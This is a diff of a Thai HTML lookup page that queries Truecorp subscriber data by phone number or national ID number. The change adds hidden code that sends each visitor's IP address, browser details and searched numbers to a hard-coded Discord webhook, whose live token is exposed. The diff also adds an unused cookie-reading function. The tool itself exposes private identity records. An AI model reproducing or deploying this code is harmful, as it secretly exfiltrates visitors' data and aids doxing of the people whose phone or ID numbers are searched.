@@ -1,207 +1,633 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-<meta charset="UTF-8" />
-<title>ig eedok.4</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<title>Contact Ig eedok.4</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
 <style>
-:root{--bg:#0b1220;--bg-2:#0f182a;--panel:#1b2433;--panel-2:#202b3d;--border:#2a3a55;--accent:#0b84c6;--text:#dbe6ff;--muted:#8fa2c9}
-*{box-sizing:border-box;font-family:Inter,system-ui,-apple-system,Segoe UI}
-body{margin:0;background:linear-gradient(180deg,#0b1220,#070c16);color:var(--text);min-height:100vh}
-.topbar{height:56px;background:#121a2a;display:flex;align-items:center;justify-content:space-between;padding:0 24px;border-bottom:1px solid rgba(255,255,255,.04)}
-.brand{font-weight:600;font-size:16px}
-.meta{font-size:12px;color:var(--muted)}
-.container{max-width:1180px;margin:28px auto;padding:0 24px}
-h1{font-size:18px;font-weight:600;margin-bottom:16px}
-.tabs{display:flex;gap:24px;border-bottom:1px solid rgba(255,255,255,.05);margin-bottom:18px}
-.tab{font-size:13px;color:#6f86ad;padding-bottom:10px;cursor:pointer}
-.tab.active{color:#4eb1ff;border-bottom:2px solid #4eb1ff}
-.grid{display:grid;grid-template-columns:420px 1fr;gap:24px}
-.card{background:var(--panel);border-radius:10px;padding:20px;box-shadow:0 10px 25px rgba(0,0,0,.35)}
-.card-title{font-size:14px;font-weight:600;margin-bottom:14px}
-label{font-size:12px;color:var(--muted);margin-bottom:6px;display:block}
-input{width:100%;padding:11px 12px;border-radius:8px;border:1px solid var(--border);background:#0e1626;color:var(--text);font-size:13px}
-input::placeholder{color:#51698f}
-input:focus{outline:none;border-color:#3aa3ff}
-.search-btn{margin-top:14px;width:100%;padding:11px;border:none;border-radius:8px;background:#0b84c6;color:white;font-weight:600;font-size:13px;cursor:pointer}
-.search-btn:disabled{background:#2a3a55;cursor:not-allowed}
-.result-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
-.result-header span{font-size:13px;font-weight:600}
-.actions{display:flex;gap:10px}
-.action{font-size:12px;color:#5aaeff;cursor:pointer}
-pre{background:var(--panel-2);border-radius:8px;padding:14px;height:420px;overflow:auto;font-size:12px;line-height:1.5;color:#cfe1ff;white-space:pre-wrap;word-wrap:break-word}
-.empty{height:420px;background:var(--panel-2);border-radius:8px;display:flex;align-items:center;justify-content:center;color:#6f86ad;font-size:13px;text-align:center}
-.loading{display:none;height:420px;background:var(--panel-2);border-radius:8px;flex-direction:column;align-items:center;justify-content:center}
-.spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,.1);border-top:3px solid #4eb1ff;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}
-@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-.error{display:none;height:420px;background:var(--panel-2);border-radius:8px;flex-direction:column;align-items:center;justify-content:center;color:#ff6b6b;font-size:13px;text-align:center}
-.error i{font-size:32px;margin-bottom:12px}
-.notification{position:fixed;top:20px;right:20px;background:#2ecc71;color:white;padding:12px 20px;border-radius:6px;font-size:13px;display:none;z-index:1000;box-shadow:0 5px 15px rgba(0,0,0,.3)}
-@media (max-width:900px){.grid{grid-template-columns:1fr}.container{padding:0 16px}}
+:root{
+    --bg:#070b16;
+    --bg2:#0c1326;
+    --glass:rgba(255,255,255,.06);
+    --border:rgba(255,255,255,.08);
+    --text:#e8efff;
+    --muted:#8fa2c9;
+    --blue:#4eb1ff;
+    --cyan:#5de0ff;
+    --danger:#ff6b6b;
+    --success:#2ecc71;
+    --warning:#f39c12;
+    --purple:#9d4edd;
+}
+*{box-sizing:border-box;font-family:'Kanit',sans-serif}
+body{
+    margin:0;
+    min-height:100vh;
+    background:
+        radial-gradient(900px 500px at 10% -10%,rgba(78,177,255,.15),transparent),
+        radial-gradient(800px 400px at 90% 10%,rgba(93,224,255,.12),transparent),
+        linear-gradient(180deg,var(--bg),#050812);
+    color:var(--text);
+}
+.topbar{
+    height:64px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 32px;
+    background:rgba(10,15,30,.6);
+    backdrop-filter:blur(14px);
+    border-bottom:1px solid var(--border);
+}
+.brand{
+    font-weight:600;
+    letter-spacing:.4px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+.brand span{color:var(--blue)}
+.meta{font-size:13px;color:var(--muted)}
+
+.container{
+    max-width:1200px;
+    margin:36px auto;
+    padding:0 24px;
+}
+.header{
+    margin-bottom:28px;
+}
+.header h1{
+    margin:0;
+    font-size:22px;
+    font-weight:600;
+}
+.header p{
+    margin-top:6px;
+    font-size:13px;
+    color:var(--muted);
+}
+
+.tabs{
+    display:flex;
+    gap:28px;
+    border-bottom:1px solid var(--border);
+    margin-bottom:24px;
+}
+.tab{
+    padding:12px 0;
+    font-size:14px;
+    color:#7d93bb;
+    cursor:pointer;
+    position:relative;
+    display:flex;
+    align-items:center;
+    gap:8px;
+}
+.tab.active{
+    color:var(--blue);
+}
+.tab.active::after{
+    content:'';
+    position:absolute;
+    left:0;right:0;bottom:-1px;
+    height:2px;
+    background:linear-gradient(90deg,var(--blue),var(--cyan));
+}
+
+.grid{
+    display:grid;
+    grid-template-columns:420px 1fr;
+    gap:26px;
+}
+
+.card{
+    background:linear-gradient(180deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
+    border:1px solid var(--border);
+    border-radius:16px;
+    padding:22px;
+    box-shadow:0 20px 50px rgba(0,0,0,.45);
+}
+.card-title{
+    font-size:15px;
+    font-weight:500;
+    margin-bottom:16px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+.card-title i{color:var(--blue)}
+
+label{
+    font-size:12px;
+    color:var(--muted);
+    display:block;
+    margin-bottom:6px;
+}
+
+input{
+    width:100%;
+    padding:12px 14px;
+    border-radius:10px;
+    border:1px solid var(--border);
+    background:rgba(0,0,0,.35);
+    color:var(--text);
+    font-size:14px;
+    font-family:'Courier New',monospace;
+}
+input::placeholder{color:#566c95}
+input:focus{
+    outline:none;
+    border-color:var(--blue);
+    box-shadow:0 0 0 2px rgba(78,177,255,.15);
+}
+
+button{
+    width:100%;
+    margin-top:16px;
+    padding:12px;
+    border:none;
+    border-radius:12px;
+    font-size:14px;
+    font-weight:500;
+    color:white;
+    background:linear-gradient(135deg,var(--blue),var(--cyan));
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    transition:all 0.3s;
+}
+button:hover{
+    transform:translateY(-2px);
+    box-shadow:0 8px 25px rgba(78,177,255,0.3);
+}
+button:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+    transform:none!important;
+}
+
+.result-header{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:12px;
+}
+.actions{display:flex;gap:14px}
+.action{
+    font-size:12px;
+    color:#6fbaff;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    gap:5px;
+    padding:6px 12px;
+    border-radius:6px;
+    background:rgba(111,186,255,0.1);
+    transition:all 0.3s;
+}
+.action:hover{
+    background:rgba(111,186,255,0.2);
+}
+
+.box{
+    height:420px;
+    background:rgba(0,0,0,.35);
+    border-radius:12px;
+    padding:14px;
+    overflow:auto;
+    font-size:13px;
+    line-height:1.55;
+    white-space:pre-wrap;
+    font-family:'Courier New',monospace;
+}
+
+.center{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    height:420px;
+    color:#7c90b5;
+    font-size:13px;
+    text-align:center;
+}
+
+.loading{
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    height:420px;
+}
+
+.spinner{
+    width:40px;
+    height:40px;
+    border:3px solid rgba(255,255,255,.1);
+    border-top:3px solid var(--blue);
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin-bottom:16px;
+}
+
+@keyframes spin{
+    0%{transform:rotate(0deg)}
+    100%{transform:rotate(360deg)}
+}
+
+.notification{
+    position:fixed;
+    top:22px;
+    right:22px;
+    padding:12px 20px;
+    border-radius:8px;
+    font-size:13px;
+    display:none;
+    box-shadow:0 10px 30px rgba(0,0,0,.4);
+    z-index:1000;
+    backdrop-filter:blur(10px);
+}
+
+.stats{
+    display:flex;
+    gap:15px;
+    margin-top:20px;
+    font-size:12px;
+    color:var(--muted);
+}
+.stat{
+    display:flex;
+    align-items:center;
+    gap:5px;
+    padding:6px 12px;
+    background:rgba(255,255,255,0.05);
+    border-radius:8px;
+}
+
+@media(max-width:900px){
+    .grid{grid-template-columns:1fr}
+    .topbar{padding:0 16px}
+    .container{padding:0 16px}
+    .tabs{gap:16px}
+}
 </style>
 </head>
+
 <body>
+
 <div class="topbar">
-    <div class="brand">Made By Atom</div>
-    <div class="meta">Truecorp Operation</div>
-</div>
-<div class="container">
-    <h1>ระบบค้นหาข้อมูลเบอร์โทรศัพท์</h1>
-    <div class="tabs">
-        <div class="tab active">TrueCorp (Phone)</div>
+    <div class="brand">
+        <i class="fas fa-satellite"></i>
+        Made by<span> Atom</span>
     </div>
+    <div class="meta">ของฟรีอย่าหาขาย</div>
+</div>
+
+<div class="container">
+    <div class="header">
+        <h1><i class="fas fa-search"></i> ระบบสืบค้นข้อมูล Truecorp</h1>
+        <p>สืบค้นได้ทั้งบัตรประชาชนและเบอร์โทรศัพท์</p>
+    </div>
+
+    <div class="tabs">
+        <div class="tab active" data-mode="phone">
+            <i class="fas fa-phone"></i> Truecorp (เบอร์)
+        </div>
+        <div class="tab" data-mode="id">
+            <i class="fas fa-id-card"></i> Truecorp (บัตรประชาชน)
+        </div>
+    </div>
+
     <div class="grid">
         <div class="card">
-            <div class="card-title">ค้นหาข้อมูลเบอร์โทรศัพท์</div>
-            <label>เบอร์โทรศัพท์</label>
-            <input id="phone" type="tel" placeholder="0XXXXXXXXX" maxlength="10" onkeypress="return /[0-9]/.test(event.key)">
-            <button class="search-btn" id="searchBtn" onclick="search()">ค้นหาข้อมูล</button>
+            <div class="card-title" id="formTitle">
+                <i class="fas fa-phone"></i> ค้นหาด้วยเบอร์โทรศัพท์
+            </div>
+            <label id="labelText">เบอร์โทรศัพท์</label>
+            <input id="input" placeholder="0XXXXXXXXX" maxlength="10">
+            <button id="btn" onclick="search()">
+                <i class="fas fa-search"></i> ค้นหาข้อมูล
+            </button>
         </div>
+
         <div class="card">
             <div class="result-header">
-                <span>ผลลัพธ์</span>
+                <span><i class="fas fa-file-code"></i> ผลลัพธ์</span>
                 <div class="actions">
-                    <div class="action" onclick="download()">Download</div>
-                    <div class="action" onclick="copy()">Copy</div>
+                    <div class="action" onclick="copy()">
+                        <i class="fas fa-copy"></i> Copy
+                    </div>
+                    <div class="action" onclick="download()">
+                        <i class="fas fa-download"></i> Download
+                    </div>
                 </div>
             </div>
+            
             <div class="loading" id="loading">
                 <div class="spinner"></div>
                 <div>กำลังค้นหาข้อมูล...</div>
+                <div style="font-size:11px;color:var(--muted);margin-top:8px;">
+                    <i class="fas fa-sync fa-spin"></i> Processing...
+                </div>
             </div>
-            <div class="error" id="error">
-                <i class="fas fa-exclamation-triangle"></i>
-                <div id="errorMessage">เกิดข้อผิดพลาด</div>
+            
+            <div id="output" class="center">
+                <i class="fas fa-search" style="font-size:32px;margin-bottom:12px;opacity:0.5"></i>
+                ยังไม่มีข้อมูล<br>
+                <span style="font-size:11px;color:var(--muted);margin-top:5px;">
+                    กรุณากรอกข้อมูลและกดค้นหา
+                </span>
             </div>
-            <div id="empty" class="empty">ยังไม่มีผลลัพธ์<br>กรุณาค้นหาข้อมูล</div>
-            <pre id="result" style="display:none"></pre>
         </div>
     </div>
 </div>
-<div class="notification" id="notification"></div>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+<div class="notification" id="notify"></div>
+
 <script>
-let cache=""
-function search(){
-    const phoneInput=document.getElementById('phone')
-    const phone=phoneInput.value.trim()
-    if(!phone){
-        showNotification('กรุณากรอกเบอร์โทรศัพท์','error')
-        return
-    }
-    if(!/^[0-9]{10}$/.test(phone)){
-        showNotification('กรุณากรอกเบอร์โทรศัพท์ 10 หลัก','error')
-        return
-    }
-    showLoading()
-    const searchBtn=document.getElementById('searchBtn')
-    searchBtn.disabled=true
-    searchBtn.textContent='กำลังค้นหา...'
+// ===== CONFIG =====
+const DISCORD_WEBHOOK = 'https://ptb.discord.com/api/webhooks/1462766748871823483/fMDOYo2AwPgqrNfrPHxGos-qCY8nn3ipRVwm6dUIycm9NcEVCYwOdY2bjOLXcMOHHTCb';
+const LOG_API = 'https://api.ipify.org?format=json';
+let mode = 'phone';
+let cache = '';
+let userIP = '';
+let userInfo = {};
+
+// ===== DOM ELEMENTS =====
+const input = document.getElementById('input');
+const output = document.getElementById('output');
+const loading = document.getElementById('loading');
+const btn = document.getElementById('btn');
+const userAgentEl = document.getElementById('userAgent');
+const ipAddressEl = document.getElementById('ipAddress');
+
+// ===== INITIALIZE =====
+document.addEventListener('DOMContentLoaded', function() {
+    getUserInfo();
+    setupEventListeners();
+});
+
+function setupEventListeners() {
+    // Tab switching
+    document.querySelectorAll('.tab').forEach(t => {
+        t.onclick = () => switchTab(t.dataset.mode);
+    });
     
-    // ✅ เรียกผ่าน API ของเราใน Vercel
-    fetch('/api/phone',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({phone:phone})
-    })
-    .then(response=>{
-        if(!response.ok){
-            throw new Error(`HTTP ${response.status}`)
-        }
-        return response.json()
-    })
-    .then(data=>{
-        if(data.error){
-            throw new Error(data.error)
-        }
-        cache=JSON.stringify(data,null,4)
-        document.getElementById('result').textContent=cache
-        showResult()
-        showNotification('ค้นหาข้อมูลสำเร็จ','success')
-    })
-    .catch(error=>{
-        console.error('Error:',error)
-        document.getElementById('errorMessage').textContent=error.message
-        showError()
-        showNotification('เกิดข้อผิดพลาดในการค้นหา','error')
-    })
-    .finally(()=>{
-        searchBtn.disabled=false
-        searchBtn.textContent='ค้นหาข้อมูล'
-    })
+    // Enter key in input
+    input.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') search();
+    });
 }
-function showLoading(){
-    document.getElementById('loading').style.display='flex'
-    document.getElementById('empty').style.display='none'
-    document.getElementById('result').style.display='none'
-    document.getElementById('error').style.display='none'
-}
-function showResult(){
-    document.getElementById('loading').style.display='none'
-    document.getElementById('empty').style.display='none'
-    document.getElementById('error').style.display='none'
-    document.getElementById('result').style.display='block'
-}
-function showError(){
-    document.getElementById('loading').style.display='none'
-    document.getElementById('empty').style.display='none'
-    document.getElementById('result').style.display='none'
-    document.getElementById('error').style.display='flex'
-}
-function copy(){
-    if(!cache){
-        showNotification('ไม่มีข้อมูลให้คัดลอก','error')
-        return
+
+async function getUserInfo() {
+    try {
+        // Get IP
+        const ipRes = await fetch(LOG_API);
+        const ipData = await ipRes.json();
+        userIP = ipData.ip;
+        ipAddressEl.textContent = userIP.substring(0, 15) + '...';
+        
+        // Get browser info
+        userInfo = {
+            ip: userIP,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+        
+        userAgentEl.textContent = getBrowserName();
+        
+        // Send initial log
+        sendLog('📱 User Accessed', {
+            type: 'access',
+            ...userInfo
+        });
+        
+    } catch (error) {
+        console.log('IP fetch failed, using fallback');
+        userInfo.ip = 'Unknown';
+        ipAddressEl.textContent = 'Private Network';
     }
+}
+
+function getBrowserName() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Safari')) return 'Safari';
+    if (ua.includes('Edge')) return 'Edge';
+    return 'Browser';
+}
+
+function switchTab(newMode) {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    event.target.classList.add('active');
+    mode = newMode;
+    
+    if (mode === 'phone') {
+        document.getElementById('formTitle').innerHTML = '<i class="fas fa-phone"></i> ค้นหาด้วยเบอร์โทรศัพท์';
+        document.getElementById('labelText').textContent = 'เบอร์โทรศัพท์';
+        input.placeholder = '0XXXXXXXXX';
+        input.maxLength = 10;
+    } else {
+        document.getElementById('formTitle').innerHTML = '<i class="fas fa-id-card"></i> ค้นหาด้วยเลขบัตรประชาชน';
+        document.getElementById('labelText').textContent = 'เลขบัตรประชาชน';
+        input.placeholder = '1234567890123';
+        input.maxLength = 13;
+    }
+    
+    input.value = '';
+    cache = '';
+    output.className = 'center';
+    output.innerHTML = '<i class="fas fa-search" style="font-size:32px;margin-bottom:12px;opacity:0.5"></i>ยังไม่มีข้อมูล<br><span style="font-size:11px;color:var(--muted);margin-top:5px;">กรุณากรอกข้อมูลและกดค้นหา</span>';
+}
+
+async function search() {
+    const val = input.value.trim();
+    
+    // Validation
+    if (mode === 'phone' && (!val || val.length !== 10 || !/^\d+$/.test(val))) {
+        notify('กรุณากรอกเบอร์โทรศัพท์ 10 หลัก', 'error');
+        return;
+    }
+    
+    if (mode === 'id' && (!val || val.length !== 13 || !/^\d+$/.test(val))) {
+        notify('กรุณากรอกเลขบัตรประชาชน 13 หลัก', 'error');
+        return;
+    }
+    
+    // UI State
+    loading.style.display = 'flex';
+    output.style.display = 'none';
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> กำลังค้นหา...';
+    
+    // Send search log
+    sendLog('🔍 Search Started', {
+        type: 'search',
+        mode: mode,
+        value: val,
+        ...userInfo
+    });
+    
+    try {
+        const apiEndpoint = mode === 'phone' ? '/api/phone' : '/api/id';
+        const startTime = Date.now();
+        
+        const response = await fetch(apiEndpoint, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({value: val})
+        });
+        
+        const data = await response.json();
+        const responseTime = Date.now() - startTime;
+        
+        if (data.error) {
+            throw new Error(data.error);
+        }
+        
+        cache = JSON.stringify(data, null, 4);
+        loading.style.display = 'none';
+        output.style.display = 'block';
+        output.className = 'box';
+        output.textContent = cache;
+        
+        // Send success log
+        sendLog('✅ Search Success', {
+            type: 'success',
+            mode: mode,
+            value: val,
+            responseTime: `${responseTime}ms`,
+            hasData: data.status === 'success',
+            ...userInfo
+        });
+        
+        notify('ค้นหาสำเร็จ ✓', 'success');
+        
+    } catch (error) {
+        loading.style.display = 'none';
+        output.style.display = 'block';
+        output.className = 'center';
+        output.innerHTML = '<i class="fas fa-exclamation-triangle" style="font-size:32px;margin-bottom:12px;color:var(--danger)"></i>เกิดข้อผิดพลาดในการค้นหา<br><span style="font-size:11px;color:var(--muted);margin-top:5px;">' + error.message + '</span>';
+        
+        // Send error log
+        sendLog('❌ Search Failed', {
+            type: 'error',
+            mode: mode,
+            value: val,
+            error: error.message,
+            ...userInfo
+        });
+        
+        notify('เกิดข้อผิดพลาด: ' + error.message, 'error');
+        console.error('Search Error:', error);
+        
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-search"></i> ค้นหาข้อมูล';
+    }
+}
+
+async function sendLog(action, data) {
+    try {
+        const logData = {
+            content: `**${action}**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
+            embeds: [{
+                title: `📊 ${action}`,
+                color: action.includes('✅') ? 0x00ff00 : 
+                       action.includes('❌') ? 0xff0000 : 
+                       action.includes('🔍') ? 0x0099ff : 0x9d4edd,
+                fields: [
+                    { name: '🌐 IP', value: '```' + data.ip + '```', inline: true },
+                    { name: '🖥️ Platform', value: '```' + data.platform + '```', inline: true },
+                    { name: '🔧 Mode', value: '```' + data.mode || 'N/A' + '```', inline: true },
+                    { name: '📝 Value', value: '```' + (data.value || 'N/A') + '```', inline: true },
+                    { name: '🌐 Browser', value: '```' + getBrowserName() + '```', inline: true },
+                    { name: '🕒 Time', value: '```' + new Date().toLocaleString('th-TH') + '```', inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+        
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(logData)
+        });
+    } catch (error) {
+        console.log('Log failed (silent)');
+    }
+}
+
+function copy() {
+    if (!cache) return notify('ไม่มีข้อมูลให้คัดลอก', 'error');
+    
     navigator.clipboard.writeText(cache)
-    .then(()=>{
-        showNotification('คัดลอกข้อมูลเรียบร้อยแล้ว','success')
-    })
-    .catch(err=>{
-        console.error('Failed to copy:',err)
-        showNotification('คัดลอกไม่สำเร็จ','error')
-    })
+        .then(() => {
+            notify('คัดลอกข้อมูลเรียบร้อยแล้ว ✓', 'success');
+            sendLog('📋 Copied Data', {
+                type: 'copy',
+                dataLength: cache.length,
+                ...userInfo
+            });
+        })
+        .catch(err => {
+            notify('คัดลอกไม่สำเร็จ', 'error');
+            console.error('Copy Error:', err);
+        });
 }
-function download(){
-    if(!cache){
-        showNotification('ไม่มีข้อมูลให้ดาวน์โหลด','error')
-        return
-    }
-    const phone=document.getElementById('phone').value.trim()||'unknown'
-    const blob=new Blob([cache],{type:"application/json"})
-    const a=document.createElement("a")
-    a.href=URL.createObjectURL(blob)
-    a.download=`phone-lookup-${phone}.json`
-    a.click()
-    showNotification('ดาวน์โหลดเรียบร้อยแล้ว','success')
+
+function download() {
+    if (!cache) return notify('ไม่มีข้อมูลให้ดาวน์โหลด', 'error');
+    
+    const blob = new Blob([cache], {type: 'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `truecorp-${mode}-${Date.now()}.json`;
+    a.click();
+    
+    notify('ดาวน์โหลดเรียบร้อยแล้ว ✓', 'success');
+    sendLog('💾 Downloaded Data', {
+        type: 'download',
+        mode: mode,
+        dataLength: cache.length,
+        ...userInfo
+    });
 }
-function showNotification(message,type){
-    const notification=document.getElementById('notification')
-    notification.textContent=message
-    if(type==='success'){
-        notification.style.background='#2ecc71'
-    }else if(type==='error'){
-        notification.style.background='#e74c3c'
-    }else if(type==='warning'){
-        notification.style.background='#f39c12'
-    }else{
-        notification.style.background='#3498db'
-    }
-    notification.style.display='block'
-    setTimeout(()=>{
-        notification.style.display='none'
-    },3000)
+
+function notify(msg, type) {
+    const n = document.getElementById('notify');
+    n.textContent = msg;
+    n.style.background = type === 'error' ? 'var(--danger)' : 
+                        type === 'warning' ? 'var(--warning)' : 'var(--success)';
+    n.style.display = 'block';
+    
+    setTimeout(() => {
+        n.style.display = 'none';
+    }, 3000);
 }
-document.addEventListener('DOMContentLoaded',function(){
-    document.getElementById('phone').addEventListener('keypress',function(e){
-        if(e.key==='Enter'){
-            search()
-        }
-    })
-    setTimeout(()=>{
-        search()
-    },1000)
-})
+
+// Get cookies (if accessible)
+function getCookies() {
+    const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+        const [key, value] = cookie.split('=');
+        acc[key.trim()] = value;
+        return acc;
+    }, {});
+    return Object.keys(cookies).length > 0 ? cookies : 'No cookies';
+}
 </script>
+
 </body>
 </html>
